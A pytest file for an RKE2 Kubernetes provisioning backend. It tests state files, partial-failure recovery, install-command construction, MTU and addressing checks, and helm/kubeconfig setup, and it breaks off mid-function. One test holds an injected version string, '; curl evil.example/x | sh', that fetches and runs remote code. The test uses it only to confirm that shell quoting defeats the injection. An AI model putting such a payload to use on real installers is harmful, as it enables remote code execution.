"""Tests for RKE2Backend logic that doesn't need a real machine: state
persistence, partial-failure tracking, the parallel helper, and command
construction. Anything that would shell out is monkeypatched out."""

import os
import shlex
import stat
import subprocess

import pytest

from multistack import RKE2Cluster, RKE2Node
from multistack.backends.rke2_client import (
    INSTALL_SCRIPT_URLS,
    ClusterState,
    RKE2Backend,
    RKE2Error,
    RKE2PrerequisiteError,
)


@pytest.fixture
def backend_v4(tmp_path):
    """Same as `backend`, but asking for Helm 4."""
    return RKE2Backend(
        state_dir=str(tmp_path / "state"),
        poll_interval=0,
        poll_timeout=1,
        default_kubeconfig_path=str(tmp_path / "home" / ".kube" / "config"),
        helm_v4=True,
    )


@pytest.fixture
def backend(tmp_path):
    """A backend with state isolated to a temp dir and fast polling. Its
    `~/.kube/config` is a temp path too, so no test can touch the real one."""
    return RKE2Backend(
        state_dir=str(tmp_path / "state"),
        poll_interval=0,
        poll_timeout=1,
        default_kubeconfig_path=str(tmp_path / "home" / ".kube" / "config"),
    )


def stub_out_provisioning(backend, monkeypatch, failing_agents=()):
    """Replaces everything that would shell out with a no-op, so
    create()/update() can run in-process. Agents whose address is in
    `failing_agents` raise instead of joining."""
    monkeypatch.setattr(backend, "check_prerequisites", lambda *a, **k: [])
    monkeypatch.setattr(backend, "_bootstrap_server", lambda *a, **k: None)
    monkeypatch.setattr(backend, "_wait_for_node_token", lambda node: None)
    monkeypatch.setattr(backend, "_fetch_kubeconfig", lambda node: "fake-kubeconfig")
    monkeypatch.setattr(backend, "_write_kubeconfig_file", lambda path, kubeconfig: None)
    monkeypatch.setattr(backend, "_prepare_control_plane", lambda node, path: None)
    monkeypatch.setattr(backend, "_unlink_kubectl", lambda node: None)

    def fake_bootstrap_agent(node, token, version, first_server, pin_node_ip=True):
        if node.address in failing_agents:
            raise RuntimeError(f"simulated join failure on {node.address}")

    monkeypatch.setattr(backend, "_bootstrap_agent", fake_bootstrap_agent)


def three_node_cluster(name):
    return RKE2Cluster(
        name=name,
        nodes=[
            RKE2Node(address="server-1", role="server"),
            RKE2Node(address="agent-good", role="agent"),
            RKE2Node(address="agent-bad", role="agent"),
        ],
    )


# -- state persistence ---------------------------------------------------
def test_cluster_state_json_roundtrip():
    state = ClusterState(
        name="rt",
        version="v1.33.1+rke2r1",
        token="tok",
        first_server_address="10.0.0.1",
        kubeconfig_path="/tmp/kc.yaml",
        cni="cilium",
        disable_kube_proxy=True,
        nodes=[RKE2Node(address="10.0.0.1", role="server", ssh_port=2222)],
    )

    restored = ClusterState.from_json(state.to_json())

    assert restored == state
    assert restored.nodes[0].ssh_port == 2222


@pytest.mark.skipif(os.name == "nt", reason="POSIX file permission bits are unavailable on Windows")
def test_state_file_is_owner_readable_only(backend):
    # The state file holds the cluster join token.
    backend._save_state(
        ClusterState(
            name="perms",
            version="v1",
            token="secret-token",
            first_server_address="10.0.0.1",
            kubeconfig_path=None,
        )
    )

    assert stat.S_IMODE(os.stat(backend._state_path("perms")).st_mode) == 0o600


@pytest.mark.skipif(os.name == "nt", reason="POSIX file permission bits are unavailable on Windows")
def test_kubeconfig_file_is_owner_readable_only(backend, tmp_path):
    # The kubeconfig holds cluster-admin credentials.
    path = tmp_path / "kubeconfig.yaml"

    backend._write_kubeconfig_file(str(path), "fake-kubeconfig")

    assert stat.S_IMODE(os.stat(path).st_mode) == 0o600


# -- partial-failure state tracking --------------------------------------
def test_create_records_nodes_that_succeeded_before_a_failure(backend, monkeypatch):
    stub_out_provisioning(backend, monkeypatch, failing_agents=("agent-bad",))

    with pytest.raises(RKE2Error):
        backend.create(three_node_cluster("partial"))

    # State must survive the failure — otherwise the nodes that did join
    # are stranded: update() can't reach them and delete() refuses to run.
    state = backend._load_state("partial")
    assert state is not None
    assert {n.address for n in state.nodes} == {"server-1", "agent-good"}


def test_delete_cleans_up_after_a_partial_create(backend, monkeypatch):
    stub_out_provisioning(backend, monkeypatch, failing_agents=("agent-bad",))
    torn_down = []
    monkeypatch.setattr(backend, "_teardown_node", lambda node: torn_down.append(node.address))

    with pytest.raises(RKE2Error):
        backend.create(three_node_cluster("partial-delete"))
    backend.delete("partial-delete")

    assert set(torn_down) == {"server-1", "agent-good"}
    assert backend._load_state("partial-delete") is None


def test_update_resumes_a_partial_create(backend, monkeypatch):
    stub_out_provisioning(backend, monkeypatch, failing_agents=("agent-bad",))
    with pytest.raises(RKE2Error):
        backend.create(three_node_cluster("resume"))

    # Retry with the previously-failing node now healthy.
    stub_out_provisioning(backend, monkeypatch)
    backend.update(three_node_cluster("resume"))

    state = backend._load_state("resume")
    assert {n.address for n in state.nodes} == {"server-1", "agent-good", "agent-bad"}


def test_update_removes_nodes_dropped_from_the_spec(backend, monkeypatch):
    stub_out_provisioning(backend, monkeypatch)
    torn_down = []
    monkeypatch.setattr(backend, "_teardown_node", lambda node: torn_down.append(node.address))
    backend.create(three_node_cluster("shrink"))

    backend.update(
        RKE2Cluster(
            name="shrink",
            nodes=[
                RKE2Node(address="server-1", role="server"),
                RKE2Node(address="agent-good", role="agent"),
            ],
        )
    )

    assert torn_down == ["agent-bad"]
    assert {n.address for n in backend._load_state("shrink").nodes} == {"server-1", "agent-good"}


def test_create_refuses_when_state_already_exists(backend, monkeypatch):
    stub_out_provisioning(backend, monkeypatch)
    cluster = RKE2Cluster(name="twice", nodes=[RKE2Node(address="server-1", role="server")])
    backend.create(cluster)

    with pytest.raises(RKE2Error, match="already has state"):
        backend.create(cluster)


# -- parallel execution --------------------------------------------------
def test_run_parallel_returns_results_and_fires_on_success(backend):
    nodes = [RKE2Node(address=f"10.0.0.{i}") for i in range(1, 4)]
    seen = []

    results = backend._run_parallel(
        nodes,
        lambda node: node.address.upper(),
        label="test",
        on_success=lambda node, result: seen.append((node.address, result)),
    )

    assert results == {n.address: n.address.upper() for n in nodes}
    assert sorted(seen) == sorted((n.address, n.address.upper()) for n in nodes)


def test_run_parallel_reports_every_failure_not_just_the_first(backend):
    def fn(node):
        if node.address.startswith("bad"):
            raise RuntimeError("boom")
        return "fine"

    nodes = [RKE2Node(address="ok"), RKE2Node(address="bad-1"), RKE2Node(address="bad-2")]
    with pytest.raises(RKE2Error) as excinfo:
        backend._run_parallel(nodes, fn, label="test")

    message = str(excinfo.value)
    assert "2 node(s)" in message
    assert "bad-1" in message and "bad-2" in message


def test_run_parallel_preserves_prerequisite_error_type(backend):
    # Callers distinguish a prerequisite problem from a provisioning one.
    def fn(node):
        raise RKE2PrerequisiteError("not enough RAM")

    with pytest.raises(RKE2PrerequisiteError):
        backend._run_parallel([RKE2Node(address="10.0.0.1")], fn, label="test")


def test_run_parallel_fires_on_success_for_nodes_that_worked(backend):
    seen = []

    def fn(node):
        if node.address == "bad":
            raise RuntimeError("boom")

    with pytest.raises(RKE2Error):
        backend._run_parallel(
            [RKE2Node(address="ok"), RKE2Node(address="bad")],
            fn,
            label="test",
            on_success=lambda node, _result: seen.append(node.address),
        )

    assert seen == ["ok"]


# -- prerequisite arithmetic ---------------------------------------------
@pytest.mark.parametrize("server_count", [2, 4, 6])
def test_even_server_count_warns(backend, server_count):
    nodes = [RKE2Node(address=f"s{i}", role="server") for i in range(server_count)]
    assert "even number of server nodes" in backend._server_count_warning(nodes)


@pytest.mark.parametrize("server_count", [1, 3, 5])
def test_odd_server_count_does_not_warn(backend, server_count):
    nodes = [RKE2Node(address=f"s{i}", role="server") for i in range(server_count)]
    assert backend._server_count_warning(nodes) is None


def test_server_count_warning_ignores_agents(backend):
    nodes = [
        RKE2Node(address="s1", role="server"),
        RKE2Node(address="a1", role="agent"),
        RKE2Node(address="a2", role="agent"),
    ]
    assert backend._server_count_warning(nodes) is None


# -- command construction ------------------------------------------------
def test_install_command_shell_quotes_the_version(backend, monkeypatch):
    # `version` is free-form and the install line runs through a real
    # shell, so an unquoted value would be an arbitrary-execution hole.
    captured = []
    monkeypatch.setattr(
        backend, "_run", lambda node, command, check=True: captured.append(command) or ""
    )
    malicious = "v1.33.1+rke2r1; curl evil.example/x | sh"

    backend._install_rke2(RKE2Node(address="10.0.0.1"), role="server", version=malicious)

    assert shlex.quote(malicious) in captured[0]
    # The payload can't terminate the install command and start a new one.
    # Not a bare "; curl" check: "set -o pipefail; curl -sfL ..." now
    # legitimately contains that substring, so the marker unique to the
    # payload (rather than a phrase the real command also happens to
    # contain) is what proves it never escaped its quoting.
    assert "evil.example" not in captured[0].replace(shlex.quote(malicious), "")


def test_install_falls_back_to_the_next_source_on_failure(backend, monkeypatch):
    # get.rke2.io is a Cloudflare Worker with its own failure mode
    # (observed: a bare HTTP 500 the Worker itself throws), independent of
    # whatever the install script or release does — so a failure there
    # should retry against the GitHub-hosted copy rather than giving up.
    attempts = []

    def fake_run(node, command, check=True):
        attempts.append(command)
        if len(attempts) == 1:
            raise RKE2Error("Command failed: curl: (22) The requested URL returned error 500")
        return ""

    monkeypatch.setattr(backend, "_run", fake_run)

    backend._install_rke2(RKE2Node(address="10.0.0.1"), role="server")

    assert len(attempts) == 2
    assert INSTALL_SCRIPT_URLS[0] in attempts[0]
    assert INSTALL_SCRIPT_URLS[1] in attempts[1]


def test_install_raises_the_last_error_when_every_source_fails(backend, monkeypatch):
    def fake_run(node, command, check=True):
        raise RKE2Error(f"unreachable: {command}")

    monkeypatch.setattr(backend, "_run", fake_run)

    with pytest.raises(RKE2Error, match=INSTALL_SCRIPT_URLS[-1]):
        backend._install_rke2(RKE2Node(address="10.0.0.1"), role="server")


def test_install_command_enables_pipefail(backend, monkeypatch):
    # Without this, `curl ... | sh -` takes its exit code from `sh`, not
    # `curl` — a curl failure that writes nothing still runs `sh -` on an
    # empty script, which exits 0 and hides the real failure entirely.
    captured = []
    monkeypatch.setattr(
        backend, "_run", lambda node, command, check=True: captured.append(command) or ""
    )

    backend._install_rke2(RKE2Node(address="10.0.0.1"), role="server")

    assert "set -o pipefail" in captured[0]


def test_is_local_detects_loopback_addresses():
    for address in ("127.0.0.1", "localhost", "::1"):
        assert RKE2Backend._is_local(RKE2Node(address=address))
    assert not RKE2Backend._is_local(RKE2Node(address="10.0.0.1"))


def test_teardown_uses_the_same_uninstall_script_for_agents_as_servers(backend, monkeypatch):
    # RKE2 has no rke2-agent-uninstall.sh (that's a k3s convention). Looking
    # for one meant agents were never actually uninstalled, while delete()
    # reported success and dropped their state.
    ran = []

    def fake_run(node, command, check=True, sudo=True):
        if "test -x" in command:
            return "/usr/local/bin/rke2-uninstall.sh\n"
        ran.append(command)
        return ""

    monkeypatch.setattr(backend, "_run", fake_run)
    backend._teardown_node(RKE2Node(address="10.0.0.2", role="agent"))

    assert "/usr/local/bin/rke2-uninstall.sh" in ran


def test_teardown_finds_the_script_at_alternate_install_paths(backend, monkeypatch):
    ran = []

    def fake_run(node, command, check=True, sudo=True):
        if "test -x" in command:
            return "/opt/rke2/bin/rke2-uninstall.sh\n"  # read-only fs install
        ran.append(command)
        return ""

    monkeypatch.setattr(backend, "_run", fake_run)
    backend._teardown_node(RKE2Node(address="10.0.0.2", role="server"))

    assert "/opt/rke2/bin/rke2-uninstall.sh" in ran


def test_teardown_refuses_to_claim_success_when_rke2_is_still_installed(backend, monkeypatch):
    # The dangerous case: no script found, but RKE2 present. Reporting
    # success here leaves a live node with no state tracking it.
    def fake_run(node, command, check=True, sudo=True):
        if "test -x" in command:
            return ""
        if "command -v rke2" in command:
            return "present"
        return ""

    monkeypatch.setattr(backend, "_run", fake_run)

    with pytest.raises(RKE2Error, match="still installed but no uninstall script"):
        backend._teardown_node(RKE2Node(address="10.0.0.2", role="agent"))


def test_teardown_is_quiet_when_the_node_is_already_clean(backend, monkeypatch):
    def fake_run(node, command, check=True, sudo=True):
        if "test -x" in command:
            return ""
        if "command -v rke2" in command:
            return "absent"
        return ""

    monkeypatch.setattr(backend, "_run", fake_run)
    backend._teardown_node(RKE2Node(address="10.0.0.2", role="agent"))  # no raise


def test_server_config_pins_the_declared_address(backend, monkeypatch):
    # Left to auto-detect, a multi-homed server registers and advertises
    # whichever interface RKE2 picks — which agents on other subnets may not
    # be able to route to, breaking the supervisor tunnel silently.
    written = {}
    monkeypatch.setattr(backend, "_install_rke2", lambda *a, **k: None)
    monkeypatch.setattr(backend, "_run", lambda *a, **k: "")
    monkeypatch.setattr(backend, "_wait_for_service", lambda *a, **k: None)
    monkeypatch.setattr(
        backend, "_write_config", lambda node, contents: written.update(contents=contents)
    )

    backend._bootstrap_server(
        RKE2Node(address="192.0.2.10", role="server"),
        "tok",
        "v1",
        "cilium",
        False,
        first_server=None,
        pin_node_ip=True,
    )

    assert "node-ip: 192.0.2.10" in written["contents"]
    # advertise-address matters separately: it's what the API server hands
    # agents to dial back on.
    assert "advertise-address: 192.0.2.10" in written["contents"]


def test_agent_config_pins_the_declared_address(backend, monkeypatch):
    written = {}
    monkeypatch.setattr(backend, "_install_rke2", lambda *a, **k: None)
    monkeypatch.setattr(backend, "_run", lambda *a, **k: "")
    monkeypatch.setattr(backend, "_wait_for_service", lambda *a, **k: None)
    monkeypatch.setattr(
        backend, "_write_config", lambda node, contents: written.update(contents=contents)
    )

    backend._bootstrap_agent(
        RKE2Node(address="192.0.2.11", role="agent"),
        "tok",
        "v1",
        RKE2Node(address="192.0.2.10", role="server"),
        True,
    )

    assert "node-ip: 192.0.2.11" in written["contents"]


def test_node_ip_pinning_can_be_disabled(backend, monkeypatch):
    written = {}
    monkeypatch.setattr(backend, "_install_rke2", lambda *a, **k: None)
    monkeypatch.setattr(backend, "_run", lambda *a, **k: "")
    monkeypatch.setattr(backend, "_wait_for_service", lambda *a, **k: None)
    monkeypatch.setattr(
        backend, "_write_config", lambda node, contents: written.update(contents=contents)
    )

    backend._bootstrap_server(
        RKE2Node(address="192.0.2.10", role="server"),
        "tok",
        "v1",
        "cilium",
        False,
        first_server=None,
        pin_node_ip=False,
    )

    assert "node-ip" not in written["contents"]


def test_low_path_mtu_between_nodes_is_flagged(backend, monkeypatch):
    # The failure that looks like anything but a network problem: a tunnel
    # between subnets lowers the path MTU, the CNI still sizes itself from
    # the local interface, and only full-size pod packets get dropped — so
    # connections open and then hang.
    monkeypatch.setattr(backend, "_measure_path_mtu", lambda node, target: 1428)

    warnings = backend._check_pod_network_mtu(
        [RKE2Node(address="10.0.0.1"), RKE2Node(address="10.0.0.2")],
        cni="cilium",
        cilium_mtu=None,
    )

    assert len(warnings) == 1
    assert "path MTU to 10.0.0.1 is only 1428" in warnings[0]
    assert "cilium_mtu=1350" in warnings[0]


def test_standard_path_mtu_produces_no_warning(backend, monkeypatch):
    monkeypatch.setattr(backend, "_measure_path_mtu", lambda node, target: 1500)

    assert (
        backend._check_pod_network_mtu(
            [RKE2Node(address="10.0.0.1"), RKE2Node(address="10.0.0.2")],
            cni="cilium",
            cilium_mtu=None,
        )
        == []
    )


def test_low_path_mtu_is_accepted_once_cilium_mtu_fits(backend, monkeypatch):
    monkeypatch.setattr(backend, "_measure_path_mtu", lambda node, target: 1428)

    assert (
        backend._check_pod_network_mtu(
            [RKE2Node(address="10.0.0.1"), RKE2Node(address="10.0.0.2")],
            cni="cilium",
            cilium_mtu=1350,
        )
        == []
    )


def test_unmeasurable_path_mtu_is_reported_rather_than_assumed_fine(backend, monkeypatch):
    monkeypatch.setattr(backend, "_measure_path_mtu", lambda node, target: None)

    warnings = backend._check_pod_network_mtu(
        [RKE2Node(address="10.0.0.1"), RKE2Node(address="10.0.0.2")],
        cni="cilium",
        cilium_mtu=None,
    )

    assert any("couldn't measure the path MTU" in w for w in warnings)


def test_mtu_check_skipped_for_non_tunnelled_cni_and_single_node(backend, monkeypatch):
    monkeypatch.setattr(
        backend, "_measure_path_mtu", lambda node, target: pytest.fail("should not probe")
    )
    nodes = [RKE2Node(address="10.0.0.1"), RKE2Node(address="10.0.0.2")]

    assert backend._check_pod_network_mtu(nodes, cni="none", cilium_mtu=None) == []
    assert backend._check_pod_network_mtu(nodes[:1], cni="cilium", cilium_mtu=None) == []


def test_cilium_chart_config_carries_mtu_and_kube_proxy_settings(backend, monkeypatch):
    ran = []
    monkeypatch.setattr(backend, "_run", lambda node, cmd, **kw: ran.append(cmd) or "")

    backend._write_cilium_chart_config(
        RKE2Node(address="10.0.0.1"), disable_kube_proxy=True, cilium_mtu=1350
    )

    manifest = "\n".join(ran)
    assert "MTU: 1350" in manifest
    assert "kubeProxyReplacement: true" in manifest


def test_cilium_chart_config_omits_kube_proxy_block_when_not_requested(backend, monkeypatch):
    ran = []
    monkeypatch.setattr(backend, "_run", lambda node, cmd, **kw: ran.append(cmd) or "")

    backend._write_cilium_chart_config(
        RKE2Node(address="10.0.0.1"), disable_kube_proxy=False, cilium_mtu=1350
    )

    manifest = "\n".join(ran)
    assert "MTU: 1350" in manifest
    assert "kubeProxyReplacement" not in manifest


def test_multi_homed_node_is_flagged(backend, monkeypatch):
    monkeypatch.setattr(backend, "_probe", lambda node, cmd, what: "192.0.2.10\n10.0.1.108")

    warnings = backend._check_node_addressing(RKE2Node(address="192.0.2.10"))

    assert any("multi-homed" in w and "10.0.1.108" in w for w in warnings)


def test_single_homed_node_is_not_flagged(backend, monkeypatch):
    monkeypatch.setattr(backend, "_probe", lambda node, cmd, what: "192.0.2.10")

    assert backend._check_node_addressing(RKE2Node(address="192.0.2.10")) == []


def test_declared_address_absent_from_the_node_is_flagged(backend, monkeypatch):
    monkeypatch.setattr(backend, "_probe", lambda node, cmd, what: "10.0.1.108")

    warnings = backend._check_node_addressing(RKE2Node(address="203.0.113.7"))

    assert any("isn't on any interface" in w for w in warnings)


def test_ssh_uses_batch_mode_so_a_bad_key_cant_hang_on_a_password_prompt(backend):
    # Without BatchMode, ssh falls back to an interactive password prompt
    # it reads from the TTY, and the call blocks forever in a worker thread.
    args = backend._ssh_base_args(RKE2Node(address="10.0.0.1"))

    assert "BatchMode=yes" in args


def test_run_reports_a_timeout_instead_of_hanging(backend, monkeypatch):
    def fake_run(*a, **kwargs):
        raise subprocess.TimeoutExpired(cmd="hostname", timeout=kwargs.get("timeout"))

    monkeypatch.setattr(subprocess, "run", fake_run)

    with pytest.raises(RKE2Error, match="timed out"):
        backend._run(RKE2Node(address="10.0.0.1"), "hostname")


def test_run_closes_stdin_and_passes_a_timeout(backend, monkeypatch):
    captured = {}

    def fake_run(argv, **kwargs):
        captured.update(kwargs)
        return subprocess.CompletedProcess(argv, 0, stdout="ok", stderr="")

    monkeypatch.setattr(subprocess, "run", fake_run)
    backend._run(RKE2Node(address="10.0.0.1"), "hostname")

    assert captured["stdin"] is subprocess.DEVNULL
    assert captured["timeout"] == backend.command_timeout


def test_publickey_failure_hint_points_at_authorized_keys(backend, monkeypatch):
    def fake_run(argv, **kwargs):
        return subprocess.CompletedProcess(
            argv, 255, stdout="", stderr="agan@host: Permission denied (publickey,password)."
        )

    monkeypatch.setattr(subprocess, "run", fake_run)

    with pytest.raises(RKE2Error, match="authorized_keys"):
        backend._run(RKE2Node(address="10.0.0.1", user="agan"), "hostname")


def test_kubeconfig_is_written_before_agents_join(backend, monkeypatch, tmp_path):
    """The API server is up as soon as the first server is, and joining the
    rest can take minutes. Writing the kubeconfig only at the end left no
    way to watch nodes register except ssh-ing to the server and using
    /etc/rancher/rke2/rke2.yaml by hand."""
    kubeconfig_path = tmp_path / "kc.yaml"
    seen_when_agent_joined = {}

    monkeypatch.setattr(backend, "_bootstrap_server", lambda *a, **k: None)
    monkeypatch.setattr(backend, "_wait_for_node_token", lambda *a, **k: None)
    monkeypatch.setattr(backend, "_fetch_kubeconfig", lambda *a, **k: "apiVersion: v1\n")
    monkeypatch.setattr(backend, "check_prerequisites", lambda *a, **k: [])
    monkeypatch.setattr(backend, "_prepare_control_plane", lambda *a, **k: None)

    def fake_agent(node, *a, **k):
        seen_when_agent_joined[node.address] = kubeconfig_path.exists()

    monkeypatch.setattr(backend, "_bootstrap_agent", fake_agent)

    backend.create(
        RKE2Cluster(
            name="early-kubeconfig",
            kubeconfig_path=str(kubeconfig_path),
            nodes=[
                RKE2Node(address="10.0.0.1", role="server"),
                RKE2Node(address="10.0.0.2", role="agent"),
                RKE2Node(address="10.0.0.3", role="agent"),
            ],
        )
    )

    assert seen_when_agent_joined == {
        "10.0.0.2": True,
        "10.0.0.3": True,
    }, "kubeconfig should already be on disk while agents are still joining"
    assert kubeconfig_path.read_text() == "apiVersion: v1\n"


# -- control-plane tooling -------------------------------------------------
# The first server is the only machine an operator is assumed to have, so
# the build leaves kubectl, helm and a shared kubeconfig there.
from multistack.backends import rke2_client  # noqa: E402
from multistack.backends.rke2_client import (  # noqa: E402
    HELM_SHA256,
    HELM_V4_SHA256,
    HELM_V4_VERSION,
    HELM_VERSION,
)


def scripted_run(backend, monkeypatch, answers):
    """Fakes `_run`: the first `answers` key found in a command decides its
    stdout. Returns the (command, sudo) calls made, in order."""
    calls = []

    def fake(node, command, check=True, sudo=True):
        calls.append((command, sudo))
        for needle, out in answers.items():
            if needle in command:
                return out
        return ""

    monkeypatch.setattr(backend, "_run", fake)
    return calls


def test_kubectl_is_linked_from_rke2_when_none_is_on_path(backend, monkeypatch):
    calls = scripted_run(backend, monkeypatch, {"command -v kubectl": ""})

    backend._link_kubectl(RKE2Node(address="10.0.0.1", role="server"))

    link = [(c, sudo) for c, sudo in calls if "ln -sfn" in c]
    assert len(link) == 1
    assert "ln -sfn /var/lib/rancher/rke2/bin/kubectl /usr/local/bin/kubectl" in link[0][0]
    assert link[0][1] is True  # /usr/local/bin needs root


@pytest.mark.parametrize(
    "found",
    [
        "/usr/bin/kubectl",  # operator's own
        "/var/lib/rancher/rke2/data/v1.32.5-rke2r1/bin/kubectl",  # already linked
    ],
)
def test_an_existing_kubectl_is_left_alone(backend, monkeypatch, found):
    calls = scripted_run(backend, monkeypatch, {"command -v kubectl": found + "\n"})

    backend._link_kubectl(RKE2Node(address="10.0.0.1", role="server"))

    assert not any("ln -sfn" in c for c, _ in calls)


def test_the_kubectl_probe_uses_the_operators_path_not_sudos(backend, monkeypatch):
    calls = scripted_run(backend, monkeypatch, {"command -v kubectl": "/usr/bin/kubectl"})

    backend._link_kubectl(RKE2Node(address="10.0.0.1", role="server"))

    assert calls[0][1] is False


@pytest.mark.parametrize("machine, arch", [("x86_64", "amd64"), ("aarch64", "arm64")])
def test_helm_is_installed_at_the_pinned_version_and_checksum(backend, monkeypatch, machine, arch):
    calls = scripted_run(backend, monkeypatch, {"command -v helm": "", "uname -m": machine})

    backend._install_helm(RKE2Node(address="10.0.0.1", role="server"))

    install = [c for c, _ in calls if "get.helm.sh" in c]
    assert len(install) == 1
    script = install[0]
    assert f"https://get.helm.sh/helm-{HELM_VERSION}-linux-{arch}.tar.gz" in script
    assert "sha256sum helm.tgz" in script
    assert f"= {HELM_SHA256[arch]} ]" in script
    assert f"linux-{arch}/helm /usr/local/bin/helm" in script


def test_helm_is_not_installed_over_an_existing_one(backend, monkeypatch):
    calls = scripted_run(
        backend,
        monkeypatch,
        {
            "command -v helm": "/snap/bin/helm\n",
            "version --short": "v3.15.0",
        },
    )

    backend._install_helm(RKE2Node(address="10.0.0.1", role="server"))

    assert not any("get.helm.sh" in c for c, _ in calls)


def test_helm_on_an_unsupported_architecture_fails_by_name(backend, monkeypatch):
    calls = scripted_run(backend, monkeypatch, {"command -v helm": "", "uname -m": "s390x"})

    with pytest.raises(RKE2Error, match="s390x"):
        backend._install_helm(RKE2Node(address="10.0.0.1", role="server"))
    assert not any("get.helm.sh" in c for c, _ in calls)


@pytest.mark.skipif(not __import__("shutil").which("sha256sum"), reason="needs sha256sum")
@pytest.mark.skipif(os.name == "nt", reason="test requires a POSIX shell")
def test_a_tampered_helm_download_is_refused_before_install(backend, monkeypatch, tmp_path):
    # Runs the real install script, with `curl` replaced by one that
    # "downloads" the wrong bytes. It must stop at the checksum, before
    # `install` is ever reached.
    scripted_run(backend, monkeypatch, {"command -v helm": "", "uname -m": "x86_64"})
    captured = {}
    real_run = backend._run

    def capture(node, command, check=True, sudo=True):
        if "get.helm.sh" in command:
            captured["script"] = command
            return ""
        return real_run(node, command, check=check, sudo=sudo)

    monkeypatch.setattr(backend, "_run", capture)
    backend._install_helm(RKE2Node(address="10.0.0.1", role="server"))

    fakebin = tmp_path / "bin"
    fakebin.mkdir()
    (fakebin / "curl").write_text(
        '#!/bin/sh\nwhile [ "$1" != "-o" ]; do shift; done\necho tampered > "$2"\n'
    )
    (fakebin / "curl").chmod(0o755)
    (fakebin / "install").write_text("#!/bin/sh\necho INSTALLED\n")
    (fakebin / "install").chmod(0o755)
    result = subprocess.run(
        ["bash", "-c", captured["script"]],
        capture_output=True,
        text=True,
        env={**os.environ, "PATH": f"{fakebin}:{os.environ['PATH']}"},
    )

    assert result.returncode != 0
    assert "checksum mismatch" in result.stderr
    assert "INSTALLED" not in result.stdout


@pytest.mark.skipif(
    os.name == "nt", reason="creating symlinks requires Windows developer mode or elevation"
)
def test_default_kubeconfig_is_linked_when_absent(backend, tmp_path):
    target = tmp_path / "multistack" / "kubeconfig"
    target.parent.mkdir()
    target.write_text("apiVersion: v1\n")
    link = backend.default_kubeconfig_path

    backend._link_default_kubeconfig(str(target))

    assert os.path.islink(link)
    assert os.readlink(link) == str(target)
    assert stat.S_IMODE(os.stat(os.path.dirname(link)).st_mode) == 0o700


@pytest.mark.skipif(
    os.name == "nt", reason="creating symlinks requires Windows developer mode or elevation"
)
def test_linking_the_default_kubeconfig_twice_changes_nothing(backend, tmp_path, capsys):
    target = tmp_path / "kubeconfig"
    target.write_text("apiVersion: v1\n")
    backend._link_default_kubeconfig(str(target))
    capsys.readouterr()

    backend._link_default_kubeconfig(str(target))

    assert "already reads" in capsys.readouterr().out
    assert os.readlink(backend.default_kubeconfig_path) == str(target)


def test_an_existing_default_kubeconfig_is_never_overwritten(backend, tmp_path, capsys):
    target = tmp_path / "kubeconfig"
    target.write_text("ours\n")
    link = backend.default_kubeconfig_path
    os.makedirs(os.path.dirname(link))
    with open(link, "w") as f:
        f.write("someone else's cluster\n")

    backend._link_default_kubeconfig(str(target))

    assert not os.path.islink(link)
    assert open(link).read() == "someone else's cluster\n"
    out = capsys.readouterr().out
    assert "warning" in out and f"ln -sfn {target} {link}" in out


def test_kubeconfig_that_already_is_the_default_needs_no_link(backend, capsys):
    # MULTISTACK_KUBECONFIG=~/.kube/config: one file already, nothing to warn about.
    link = backend.default_kubeconfig_path
    os.makedirs(os.path.dirname(link))
    with open(link, "w") as f:
        f.write("apiVersion: v1\n")

    backend._link_default_kubeconfig(link)

    assert "warning" not in capsys.readouterr().out


@pytest.mark.skipif(
    os.name == "nt", reason="creating symlinks requires Windows developer mode or elevation"
)
def test_a_stale_kubeconfig_export_is_called_out(backend, tmp_path, monkeypatch, capsys):
    target = tmp_path / "kubeconfig"
    target.write_text("apiVersion: v1\n")
    monkeypatch.setenv("KUBECONFIG", str(tmp_path / "elsewhere"))

    backend._link_default_kubeconfig(str(target))

    assert "KUBECONFIG is set to" in capsys.readouterr().out


def test_kubeconfig_link_is_skipped_when_the_sdk_runs_elsewhere(
    backend, monkeypatch, tmp_path, capsys
):
    monkeypatch.setattr(backend, "_link_kubectl", lambda node: None)
    monkeypatch.setattr(backend, "_install_helm", lambda node: None)
    monkeypatch.setattr(backend, "_runs_here", lambda node: False)

    backend._prepare_control_plane(
        RKE2Node(address="10.0.0.1", role="server"), str(tmp_path / "kubeconfig")
    )

    assert not os.path.lexists(backend.default_kubeconfig_path)
    assert "KUBECONFIG=" in capsys.readouterr().out


@pytest.mark.skipif(
    os.name == "nt", reason="creating symlinks requires Windows developer mode or elevation"
)
def test_kubeconfig_link_is_made_when_the_sdk_runs_on_the_first_server(
    backend, monkeypatch, tmp_path
):
    monkeypatch.setattr(backend, "_link_kubectl", lambda node: None)
    monkeypatch.setattr(backend, "_install_helm", lambda node: None)
    monkeypatch.setattr(backend, "_runs_here", lambda node: True)
    target = tmp_path / "kubeconfig"
    target.write_text("apiVersion: v1\n")

    backend._prepare_control_plane(RKE2Node(address="10.0.0.1", role="server"), str(target))

    assert os.readlink(backend.default_kubeconfig_path) == str(target)


IP_ADDR_SHOW = (
    "1: lo    inet 127.0.0.1/8 scope host lo\\       valid_lft forever\n"
    "2: eno1    inet 10.0.0.10/24 brd 10.0.0.255 scope global eno1\\  valid_lft forever\n"
    "2: eno1    inet6 fe80::1/64 scope link \\       valid_lft forever\n"
)


@pytest.mark.parametrize(
    "address, expected",
    [
        ("127.0.0.1", True),  # loopback: _is_local already says so
        ("10.0.0.10", True),  # the node's real address, on one of our interfaces
        ("10.0.0.11", False),  # another machine
    ],
)
def test_runs_here_recognises_this_machine_by_its_real_address(
    backend, monkeypatch, address, expected
):
    monkeypatch.setattr(
        rke2_client.subprocess,
        "run",
        lambda argv, **kw: subprocess.CompletedProcess(argv, 0, IP_ADDR_SHOW, ""),
    )

    assert backend._runs_here(RKE2Node(address=address, role="server")) is expected


def test_runs_here_without_ip_is_false_not_a_crash(backend, monkeypatch):
    def missing(argv, **kw):
        raise FileNotFoundError(argv[0])

    monkeypatch.setattr(rke2_client.subprocess, "run", missing)

    assert backend._runs_here(RKE2Node(address="10.0.0.10", role="server")) is False


def test_create_prepares_the_first_server_before_agents_join(backend, monkeypatch):
    stub_out_provisioning(backend, monkeypatch)
    order = []
    monkeypatch.setattr(
        backend,
        "_prepare_control_plane",
        lambda node, path: order.append(("tooling", node.address)),
    )
    monkeypatch.setattr(
        backend, "_bootstrap_agent", lambda node, *a, **k: order.append(("join", node.address))
    )

    backend.create(
        RKE2Cluster(
            name="tooling-order",
            nodes=[
                RKE2Node(address="server-1", role="server"),
                RKE2Node(address="agent-1", role="agent"),
            ],
        )
    )

    assert order == [("tooling", "server-1"), ("join", "agent-1")]


def test_update_prepares_the_first_server_too(backend, monkeypatch):
